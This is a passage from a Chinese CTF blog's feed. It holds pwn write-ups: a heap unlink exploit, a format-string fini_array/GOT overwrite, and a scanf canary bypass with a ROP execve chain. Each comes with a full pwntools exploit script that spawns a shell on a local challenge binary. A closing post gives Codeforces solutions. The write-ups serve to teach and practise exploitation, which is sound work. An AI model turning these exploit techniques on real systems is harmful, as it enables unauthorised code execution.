class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Mmap: '</span>)</span><br><span class="line">mmap_addr=int(p.recvn(<span class="number">12</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(mmap_addr)</span><br><span class="line">bbs_addr=creat(<span class="number">0x38</span>)</span><br><span class="line">base_addr=int(bbs_addr[<span class="number">2</span>:],<span class="number">16</span>)<span class="number">-0x202068</span></span><br><span class="line"><span class="keyword">print</span> hex(int(bbs_addr[<span class="number">2</span>:],<span class="number">16</span>)<span class="number">-0x202068</span>)</span><br><span class="line">creat(<span class="number">0xf0</span>)</span><br><span class="line">creat(<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#creat(0x28)</span></span><br><span class="line"><span class="comment">#fake_chunk=[0,0x31,base_addr+0x202078-0x18,base_addr+0x202078-0x10]</span></span><br><span class="line">unlink=p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(base_addr+<span class="number">0x202068</span><span class="number">-0x18</span>)+p64(base_addr+<span class="number">0x202068</span><span class="number">-0x10</span>)+<span class="string">'a'</span>*<span class="number">16</span>+p64(<span class="number">0x30</span>)</span><br><span class="line">fill(<span class="number">0</span>,unlink)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0x38</span>)*<span class="number">2</span>+p64(<span class="number">0x100</span>)+p64(base_addr+<span class="number">0x202070</span>)+p64(<span class="number">0x140</span>)+p64(mmap_addr))</span><br><span class="line">fill(<span class="number">1</span>,asm(shellcraft.sh()))</span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0x140</span>)+p64(base_addr+<span class="number">0x202080</span>))</span><br><span class="line">fill(<span class="number">1</span>,p64(<span class="number">0x20</span>)+p64(<span class="number">0x91</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>*<span class="number">8</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x21</span>)*<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0x140</span>)+p64(base_addr+<span class="number">0x202090</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">fill(<span class="number">0</span>,p64(<span class="number">0x140</span>)+p64(base_addr+<span class="number">0x202090</span>)+<span class="number">2</span>*p64(<span class="number">0</span>))</span><br><span class="line">fill(<span class="number">1</span>,p64(<span class="number">0x140</span>)+<span class="string">'\x10'</span>)</span><br><span class="line">fill(<span class="number">3</span>,p64(mmap_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(<span class="string">'32'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;BabyRe&quot;&gt;&lt;a href=&quot;#BabyRe&quot; class=&quot;headerlink&quot; title=&quot;BabyRe&quot;&gt;&lt;/a&gt;BabyRe&lt;/h2&gt;&lt;p&gt;三层，第一层是迷宫，第二层是base64解码，最后一层第1组与2，3，4组的运算结</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="sctf2019" scheme="http://pidanxu.github.io/tags/sctf2019/"/>
    
  </entry>
  
  <entry>
    <title>2019信安国赛线下赛</title>
    <link href="http://pidanxu.github.io/2019/06/08/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    <id>http://pidanxu.github.io/2019/06/08/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/</id>
    <published>2019-06-08T15:38:42.000Z</published>
    <updated>2019-06-11T14:37:58.552Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p><img src="https://s2.ax1x.com/2019/06/08/VD7iyn.png" alt="1"></p><p>但是printf结束后就return 0了。此时可以发现其保护为no relro</p><p><img src="https://s2.ax1x.com/2019/06/08/VD78w6.png" alt="2"></p><p>这样不但能写got表，还能写fini_array。main函数执行之前，start会做一些初始化，也就是Init。</p><p>然后main执行完毕，也会做一些析构工作，就是fini。所以我们把fini_array的内容写成main地址，就能循环了。</p><h3 id="Fmtstr"><a href="#Fmtstr" class="headerlink" title="Fmtstr"></a>Fmtstr</h3><p>首先要获得格式化字符串偏移，看栈或者用脚本。(其实就是输入AAAA%p%p%p%p，第四个%p会打印出AAAA的ascii码，所以偏移是4)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fmt_test.py</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></span><br><span class="line">   p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">   p.sendline(payload)</span><br><span class="line">   <span class="keyword">return</span> p.recvall()</span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line"><span class="keyword">print</span> autofmt.offset</span><br></pre></td></tr></table></figure><p>或者利用如上脚本也能获得offset</p><p>然后利用fmtstr_payload()就可以自动生成payload写入了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">strlenGot = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(systemPlt),hex(strlenGot)</span><br><span class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(mainSymbol),hex(finiSymbol)</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',4004)</span></span><br><span class="line">offset =<span class="number">4</span></span><br><span class="line">writes = &#123;finiSymbol:mainSymbol,strlenGot:systemPlt&#125;</span><br><span class="line"><span class="comment">#padding = 'aa'</span></span><br><span class="line">payload1 =  fmtstr_payload(offset=<span class="number">4</span>,writes=writes,numbwritten = <span class="number">0</span>,write_size=<span class="string">'short'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"payload:len = %d   :%s"</span>%(len(payload1),payload1)</span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload2 = <span class="string">'/bin/sh'</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><h3 id="栈溢出-scanf绕过canary"><a href="#栈溢出-scanf绕过canary" class="headerlink" title="栈溢出-scanf绕过canary"></a>栈溢出-scanf绕过canary</h3><p>改自pwnable.tw double sort。问题是。。。改得啥都没法泄露了，排序也没用了。</p><p><img src="https://i.loli.net/2019/06/11/5cffb2c84269132951.png" alt="1560261277193"></p><p>这题我佛了，归并排序逆完并没有任何用，还以为能泄露</p><p>其漏洞点在于栈溢出，+和-可以跳过scanf的%u检查并不改变canary的值。</p><p>所以可以成功绕过canary</p><h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><p>俺佛了，啥都没法泄露还要getshell。万幸有int 80h可以系统调用。构造ROP链就vans了</p><p>ROPgadget –binary pwn –only “mov|ret” 查找可以栈迁移的指令，发现一个高兴坏了。</p><p><img src="https://i.loli.net/2019/06/11/5cffb45e3546429192.png" alt="1560261701348"></p><p>然后找pop ecx;ret的，就可以栈迁移了</p><p><img src="https://i.loli.net/2019/06/11/5cffb51d5e61040094.png" alt="1560261905775"></p><p>因为后面构造scanf调用，bss在第二个参数，所以pop ecx在第二个最好，选0x8070520</p><p>为啥要用scanf不用read呢，因为read第一个参数是0，循环直接就退出了。</p><p>scanf输入合适payload在Bss段过后就可以栈迁移了。</p><p>栈迁移过后还不能直接getshell，因为scanf读不了空格0x20，读不了0xb，我真的服了。所以再构造一个read函数吧。调用int 80h，eax是其调用号应该为11，是sys_execve 。ebx是参数，也就是’/bin/sh’的地址。所以找到pop eax就成了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.aslr = <span class="literal">False</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Name:'</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'stop)'</span>)</span><br><span class="line">p.sendline(<span class="string">'330'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#0x080b9a92 : mov esp, ecx ; ret</span></span><br><span class="line"><span class="comment">#0x08070520 : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="comment">#0x080b9856 : pop eax ; ret</span></span><br><span class="line"><span class="comment">#0x0806e173 : int 0x80</span></span><br><span class="line">bss_addr=<span class="number">0x80ECF80</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'+'</span>)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x8049980</span>))<span class="comment">#retn</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x80500E0</span>))<span class="comment">#scanf</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x08070520</span>))</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x80CF3C0</span>))<span class="comment">#%s</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(str(bss_addr))</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x100</span>))</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x080b9a92</span>))<span class="comment">#move satck to bss</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">payload=p32(<span class="number">0x806EAC0</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0</span>)+p32(bss_addr+<span class="number">4</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">'result'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#payload=p32(0x806EAC0)+p32(0x08070520)+p32(0)+p32()</span></span><br><span class="line">payload=p32(<span class="number">0x08070520</span>)+<span class="number">2</span>*p32(<span class="number">0xdeadbeef</span>)+p32(bss_addr+<span class="number">28</span>+<span class="number">4</span>)+p32(<span class="number">0x080b9856</span>)+p32(<span class="number">11</span>)+p32(<span class="number">0x0806e173</span>)+<span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h2&gt;&lt;h3 id=&quot;格式化字符串&quot;&gt;&lt;a href=&quot;#格式化字符串&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="ctf wp" scheme="http://pidanxu.github.io/categories/ctf-wp/"/>
    
    
    <category term="pwn" scheme="http://pidanxu.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>19-0604算法总结</title>
    <link href="http://pidanxu.github.io/2019/06/04/19-0604%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://pidanxu.github.io/2019/06/04/19-0604%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2019-06-04T12:44:10.000Z</published>
    <updated>2019-06-04T12:47:49.899Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="1166-C"><a href="#1166-C" class="headerlink" title="1166-C"></a>1166-C</h3><p>没啥好说的，二分法函数lower_bound和upper_bound要会用。在algorithm里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">ll a[<span class="number">200001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;<span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">a[i]=<span class="built_in">abs</span>(a[i]);</span><br><span class="line">&#125;</span><br><span class="line">sort(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">ll sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;++i)</span><br><span class="line">sum+=((upper_bound(a+i,a+<span class="number">1</span>+n,<span class="number">2</span>*a[i])-a)-i<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1155-D"><a href="#1155-D" class="headerlink" title="1155-D"></a>1155-D</h3><p>动态规划是给人做的嗷？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,x;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;x;</span><br><span class="line">ll a[<span class="number">300001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">ll dp[<span class="number">3</span>][<span class="number">300001</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">ll res=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//首先找出都没乘以x的最大子组</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line">dp[<span class="number">0</span>][i]=a[i]+max(dp[<span class="number">0</span>][i<span class="number">-1</span>],(ll)<span class="number">0</span>);<span class="comment">//只要前面和是正数就可以加上，dp[0][i]表示该连续子组一定是a[i]结尾，且为其算上a[i]和的最大值。</span></span><br><span class="line">res=max(res,dp[<span class="number">0</span>][i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//然后是找以a[i]结尾，且a[i]乘了x的子组</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line">dp[<span class="number">1</span>][i]=a[i]*x+max(max(dp[<span class="number">1</span>][i<span class="number">-1</span>],dp[<span class="number">0</span>][i<span class="number">-1</span>]),(ll)<span class="number">0</span>);<span class="comment">//也就是说乘以x要么从当前开始，要么加上上一个也乘了x的子组最大，要么前面都没乘。</span></span><br><span class="line">res=max(res,dp[<span class="number">1</span>][i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最后是a[i]没乘，前面乘了的情况</span></span><br><span class="line"><span class="keyword">if</span>(n&gt;<span class="number">1</span>)</span><br><span class="line">dp[<span class="number">2</span>][<span class="number">2</span>]=a[<span class="number">2</span>]+a[<span class="number">1</span>]*x;<span class="comment">//这种情况至少从a[2]开始</span></span><br><span class="line">res=max(res,dp[<span class="number">2</span>][<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line">dp[<span class="number">2</span>][i]=a[i]+max(dp[<span class="number">2</span>][i<span class="number">-1</span>],dp[<span class="number">1</span>][i<span class="number">-1</span>]);</span><br><span class="line">res=max(res,dp[<span class="number">2</span>][i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;res&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;1166-C&quot;&gt;&lt;a href=&quot;#1166-C&quot; class=&quot;headerlink&quot; title=&quot;1166-C&quot;&gt;&lt;/a&gt;1166-C&lt;/h3&gt;&lt;p&gt;没啥好说的，二分法函数lower_bound和upper_bound要会用。在al</summary>
      
    
    
    
    <category term="oi" scheme="http://pidanxu.github.io/categories/oi/"/>
    
    
    <category term="codeforce" scheme="http://pidanxu.github.io/tags/codeforce/"/>
    
  </entry>
  
</feed>
